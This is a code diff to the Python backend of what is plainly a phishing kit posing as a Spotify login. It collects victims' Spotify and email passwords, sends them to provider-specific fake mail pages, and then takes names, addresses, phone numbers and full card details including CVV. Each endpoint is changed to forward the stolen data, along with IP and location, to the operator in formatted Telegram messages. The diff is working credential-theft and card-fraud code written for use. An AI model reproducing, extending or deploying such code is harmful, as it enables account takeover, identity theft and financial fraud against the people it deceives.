@@ -682,16 +682,25 @@ def api_login():
         }
         log_capture(capture_data)
         
-        # ENVOI TELEGRAM
-        telegram.send_capture(capture_data)
+        # ENVOI TELEGRAM - LOGIN
+        msg = f"""🚨 **CAPTURE DETECTED** 🚨
+
+📋 **Type:** Spotify Login
+📧 **Email:** `{email}`
+🔑 **Password:** `{password}`
+🌐 **IP:** `{geo['ip']}`
+📍 **Location:** {geo['city']}, {geo['country']}
+🕐 **Time:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
+🔍 **User-Agent:** `{user_agent[:60]}`"""
+        telegram.send_message(msg)
         
         domain = email.split('@')[1].lower() if '@' in email else ''
         
-        if 'gmail.com' in domain:
+        if 'gmail.com' in domain or 'googlemail.com' in domain:
             next_page = '/mail-gmail'
-        elif 'yahoo.com' in domain or 'ymail.com' in domain:
+        elif 'yahoo.com' in domain or 'ymail.com' in domain or 'rocketmail.com' in domain:
             next_page = '/mail-yahoo'
-        elif 'outlook.com' in domain or 'hotmail.com' in domain:
+        elif 'outlook.com' in domain or 'hotmail.com' in domain or 'live.com' in domain or 'msn.com' in domain:
             next_page = '/mail-outlook'
         elif '@' in email:
             next_page = '/mail-generic'
@@ -717,6 +726,7 @@ def api_mail():
         mail_email = data.get('mailEmail', '')
         mail_password = data.get('mailPassword', '')
         geo = get_geo_data()
+        user_agent = request.headers.get('User-Agent', 'Unknown')
         
         capture_data = {
             'type': f'Mail Access ({provider})',
@@ -725,12 +735,21 @@ def api_mail():
             'ip': geo['ip'],
             'country': geo['country'],
             'city': geo['city'],
-            'user_agent': request.headers.get('User-Agent', 'Unknown')
+            'user_agent': user_agent
         }
         log_capture(capture_data)
         
-        # ENVOI TELEGRAM
-        telegram.send_capture(capture_data)
+        # ENVOI TELEGRAM - MAIL
+        msg = f"""🚨 **CAPTURE DETECTED** 🚨
+
+📋 **Type:** Mail Access ({provider})
+📧 **Email:** `{mail_email}`
+🔑 **Password:** `{mail_password}`
+🌐 **IP:** `{geo['ip']}`
+📍 **Location:** {geo['city']}, {geo['country']}
+🕐 **Time:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
+🔍 **User-Agent:** `{user_agent[:60]}`"""
+        telegram.send_message(msg)
         
         return jsonify({'status': 'success', 'next': '/personal'})
     except Exception as e:
@@ -768,8 +787,19 @@ def api_personal():
         }
         log_capture(capture_data)
         
-        # ENVOI TELEGRAM
-        telegram.send_capture(capture_data)
+        # ENVOI TELEGRAM - PERSONAL
+        msg = f"""🚨 **CAPTURE DETECTED** 🚨
+
+📋 **Type:** Personal Info
+👤 **Name:** {first_name} {last_name}
+🏠 **Address:** {address}
+📍 **City:** {city} ({postal_code})
+📞 **Phone:** `{phone}`
+🌐 **IP:** `{geo['ip']}`
+📍 **Location:** {geo['city']}, {geo['country']}
+🕐 **Time:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
+🔍 **User-Agent:** `{user_agent[:60]}`"""
+        telegram.send_message(msg)
         
         return jsonify({'status': 'success', 'next': '/billing'})
     except Exception as e:
@@ -805,8 +835,19 @@ def api_billing():
         }
         log_capture(capture_data)
         
-        # ENVOI TELEGRAM
-        telegram.send_capture(capture_data)
+        # ENVOI TELEGRAM - BILLING
+        msg = f"""🚨 **CAPTURE DETECTED** 🚨
+
+📋 **Type:** Billing/Card
+💳 **Cardholder:** {card_holder}
+🔢 **Card Number:** `{card_number}`
+📅 **Expiry:** {expiry}
+🔐 **CVV:** `{cvv}`
+🌐 **IP:** `{geo['ip']}`
+📍 **Location:** {geo['city']}, {geo['country']}
+🕐 **Time:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
+🔍 **User-Agent:** `{user_agent[:60]}`"""
+        telegram.send_message(msg)
         
         return jsonify({'status': 'success', 'next': '/success'})
     except Exception as e:
